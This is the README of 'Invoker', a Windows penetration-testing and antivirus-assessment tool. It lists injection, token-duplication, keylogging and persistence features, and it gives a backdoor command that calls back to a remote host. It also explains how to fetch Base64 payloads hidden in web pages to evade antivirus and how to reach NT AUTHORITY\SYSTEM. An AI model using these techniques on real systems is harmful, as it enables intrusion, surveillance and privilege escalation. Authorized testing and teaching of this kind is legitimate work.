# Invoker

Penetration testing utility and antivirus assessment tool.

Built with Visual Studio Community 2019 v16.9.3 (64-bit) and tested on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

**This repository started to have known signatures and I don't have time to upload new executables each time so you should compile this project yourself.**

Future plans:

* DLL proxying,
* COM hijacking,
* more direct system calls.

## Table of Contents

* [Invoker Library](#invoker-library)
* [How to Run](#how-to-run)
* [Bytecode Injection](#bytecode-injection)
* [Generate a Reverse Shell Payload](#generate-a-reverse-shell-payload)
* [PowerShell Scripts](#powershell-scripts)
* [Direct System Calls](#direct-system-calls)
* [Make a DLL With a Hook Procedure](#make-a-dll-with-a-hook-procedure)
* [Get the LocalSystem Account (NT AUTHORITY\SYSTEM)](#get-the-localsystem-account-nt-authoritysystem)
* [Images](#images)

## Invoker Library

Capabilities:

* invoke the Command Prompt and PowerShell,
* ~~make a direct system call,~~
* use Windows Management Instrumentation (WMI),
* connect to a remote host,
* run a new process,
* terminate a running process,
* dump a process memory,
* inject a bytecode into a running process,
* inject a DLL into a running process,
* list DLLs of a running process,
* install a hook procedure,
* enable access token privileges,
* duplicate the access token of a running process,
* download a file,
* add a registry key,
* schedule a task,
* list unquoted service paths and restart a running service,
* replace System32 files.

Some features may require administrative privileges.

Check the library [here](https://github.com/ivan-sincek/invoker/blob/master/src/Invoker_x64/Invoker/lib/invoker/invoker.cpp). Feel free to use it!

## How to Run

Run Invoker_x86.exe (32-bit) or Invoker_x64.exe (64-bit).

To automate the backdoor while setting up a persistence, run the following command:

```fundamental
Invoker_x64.exe 192.168.8.5:9000
```

32-bit Invoker can:

* ~~make a direct system call,~~
* dump the memory of a 32-bit process,
* inject a 32-bit bytecode into a 32-bit process,
* inject a 32-bit DLL into a 32-bit process,
* list DLLs of a 32-bit process,
* install a hook procedure from a 32-bit DLL.

64-bit Invoker can:

* make a direct system call,
* dump the memory of a 32-bit process,
* dump the memory of a 64-bit process,
* inject a 32-bit bytecode into a 32-bit process,
* inject a 64-bit bytecode into a 64-bit process,
* ~~inject a 32-bit DLL into a 32-bit process,~~
* inject a 64-bit DLL into a 64-bit process,
* ~~list DLLs of a 32-bit process,~~
* list DLLs of a 64-bit process.
* ~~install a hook procedure from a 32-bit DLL,~~
* install a hook procedure from a 64-bit DLL.

## Bytecode Injection

Elevate privileges by injecting bytecode into a higher-privileged process.

This tool can parse an HTTP response as well as extract the payload from a custom element, e.g. from `<invoker>payload</invoker>` where `payload` is a binary code/file encoded in Base64.

Check the example at [pastebin.com/raw/xf9Trt0d](https://pastebin.com/raw/xf9Trt0d).

This might be useful if antivirus is constantly deleting your local payloads.

Also, check an additional example at [pastebin.com/raw/iW17rCxH](https://pastebin.com/raw/iW17rCxH) - payload hidden in the image element.

P.S. Bytecodes provided will most certainly not work for you.

Use [ngrok](https://ngrok.com) to give your local web server a public address.

---

Too see if a process is 32-bit or 64-bit open up Task Manager -> click on `More details` -> go to `Details` tab -> right click on any of the columns -> click on `Select columns` -> check the `Platform` checkbox.

Additionally, to see if a process is running with administrative privileges check the `Elevated` checkbox.

## Generate a Reverse Shell Payload

Find out how to generate a reverse shell payload from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#generate-a-reverse-shell-payload-for-windows-os), as well as, find out how to set up an [Ncat](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#ncat) and [multi/handler](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#multihandler) listeners.

## PowerShell Scripts

If you wish to run a PowerShell reverse or bind shell from the Invoker, check my other [project](https://github.com/ivan-sincek/powershell-reverse-tcp).

Just copy and paste any of the [one-liners](https://github.com/ivan-sincek/powershell-reverse-tcp#powershell-encoded-command) in your PowerShell session.

## Direct System Calls

Direct system calls library and assembly were generated with [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2). Credits to the author! As of this writing, this tool only supports 64-bit direct system calls.

Capabilities:

* inject a bytecode into a running process,
* inject a DLL into a running process.

To generate the same library and assembly, run the following command from your preferred console:

```fundamental
python syswhispers.py -f NtOpenProcess,NtClose,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtCreateThreadEx -o syscalls
```

Check my wrapper for the library [here](https://github.com/ivan-sincek/invoker/blob/master/src/Invoker_x64/Invoker/lib/syscalls/invoker_syscalls.cpp). Feel free to use it!

## Make a DLL With a Hook Procedure

Find out how to make a simple DLL with a hook procedure [here](https://github.com/ivan-sincek/invoker/blob/master/src/InvokerHook/InvokerHook/dllmain.cpp). The hook procedure will invoke a message box on each window close.

Also, check out a keyboard hook procedure (i.e. keylogger) [here](https://github.com/ivan-sincek/invoker/blob/master/src/KeyboardHook/KeyboardHook/dllmain.cpp).

**Always remove all the created artifacts after you are done testing, e.g. remove `keylogger.log`.**

## Get the LocalSystem Account (NT AUTHORITY\SYSTEM)

Run the Invoker as administrator.

Enable all access token privileges.

Duplicate the access token from e.g. Windows Logon Application (winlogon.exe) and run a new instance of the Invoker.

Within the new Invoker instance, open the Command Prompt and run `whoami`, you should now see `nt authority\system`.

Enable all access token privileges once again.

Close the old Invoker instance.

P.S. You get more access token privileges from Local Security Authority Subsystem Service (lsass.exe).

## Images

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/invoker.jpg" alt="Invoker"></p>

<p align="center">Figure 1 - Invoker</p>

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/registry.jpg" alt="Add/Edit Registry Key"></p>

<p align="center">Figure 2 - Add/Edit Registry Key</p>

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/bytecode_injection.jpg" alt="Bytecode Injection"></p>

<p align="center">Figure 3 - Bytecode Injection</p>

<p align="center"><img src="https://github.com/ivan-sincek/invoker/blob/master/img/elevated_privileges.jpg" alt="Elevated Privileges"></p>

<p align="center">Figure 4 - Elevated Privileges</p>
